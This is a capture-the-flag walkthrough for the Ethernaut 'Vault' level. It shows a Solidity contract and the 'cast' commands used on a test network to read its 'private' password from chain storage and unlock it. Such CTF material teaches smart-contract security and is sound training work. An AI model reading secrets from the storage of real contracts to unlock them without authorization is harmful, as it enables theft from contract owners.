---
title: "Vault"
rags: ["Variables", "Storage"]
reference: https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670
---

# Description

Unlock the vault to pass the level!

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

# Solution

1. To unlock the vault we need to provide the correct password to the `unlock` function

2. We can get the password by looking at the contract state variable `password` because all state variables are publicly stored on chain.

3. get the password

```
tim@tim-virtual-machine ~/g/the-ethernaut (main)> cast storage 0xE4778ADB9670cA700251a6A1920B935fa8595b74 1 --rpc-url $BASE_SEPOLIA_RPC
0x412076657279207374726f6e67207365637265742070617373776f7264203a29 // password variable
tim@tim-virtual-machine ~/g/the-ethernaut (main)> cast storage 0xE4778ADB9670cA700251a6A1920B935fa8595b74 0 --rpc-url $BASE_SEPOLIA_RPC
0x0000000000000000000000000000000000000000000000000000000000000001 // locked variable
```

storage layout ref: https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html

4. unlock the vault

```
cast send 0xE4778ADB9670cA700251a6A1920B935fa8595b74 "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url $BASE_SEPOLIA_RPC --private-key
```
